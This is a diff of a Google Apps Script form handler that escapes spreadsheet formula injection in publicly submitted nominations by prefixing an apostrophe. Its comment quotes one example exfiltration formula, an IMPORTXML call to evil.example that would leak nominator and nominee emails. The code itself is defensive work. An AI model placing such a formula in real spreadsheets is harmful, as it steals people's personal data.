@@ -122,29 +122,33 @@ function ensureRoom(sheet, rows, columns) {
 
 /* Writes one row as TEXT.
  *
- * setValues interprets a string beginning with "=" as a FORMULA. A nominee
- * description is free text written by the public, so without this a nomination
- * reading =IMPORTXML("https://evil.example/?"&D2,"//a") becomes a live formula
- * that exfiltrates the panel's sheet -- every nominator and nominee email in
- * it -- the moment a judge opens the tab. Setting the number format to "@"
- * (plain text) makes Sheets store the characters instead of evaluating them.
+ * A string beginning with "=", "+", "-" or "@" is parsed as a FORMULA on
+ * write. A nominee description is free text written by the public, so a
+ * nomination reading =IMPORTXML("https://evil.example/?"&D2,"//a") would
+ * otherwise become a live formula that exfiltrates the panel's sheet -- every
+ * nominator and nominee email in it -- the moment a judge opens the tab.
  *
- * The flush between the two is not decoration, and this was established the
- * hard way: with setNumberFormat immediately followed by setValues, a live
- * submission of "=1+1 ..." landed in the sheet as #ERROR! -- Sheets had parsed
- * it. Both calls are buffered and committed together, so the value is
- * evaluated before the format it was supposed to be protected by exists. The
- * flush commits the format first, which is the whole point.
+ * Two earlier attempts at this were wrong, both for the same reason, so it is
+ * worth being exact: setNumberFormat('@') stops formula entry in the
+ * SPREADSHEET UI. It does not constrain setValues, which parses the string
+ * whatever the cell's format is, and no amount of ordering or flushing changes
+ * that. Verified against the live sheet on 2026-10-19: "=1+1" was stored as 2
+ * with the format set, and again with the format set and flushed first.
  *
- * This cannot be proved by reading this file. The test in
- * tools/nomination-sheet.test.mjs checks the three calls are in this order and
- * nothing more; only a real write to a real sheet shows the behaviour. */
+ * A leading apostrophe is Sheets' own "treat this as text" marker. It is
+ * consumed on write and is not part of the stored value. The number format is
+ * kept because it still governs how an already-stored value is displayed. */
+function asText(value) {
+  var s = String(value);
+  return /^[=+\-@]/.test(s) ? "'" + s : s;
+}
+
 function writeTextRow(sheet, rowNumber, values) {
   var range = sheet.getRange(rowNumber, 1, 1, values.length);
   range.setNumberFormat('@');
-  SpreadsheetApp.flush();
-  range.setValues([values.map(String)]);
+  range.setValues([values.map(asText)]);
 }
+
 
 function doPost(e) {
   try {
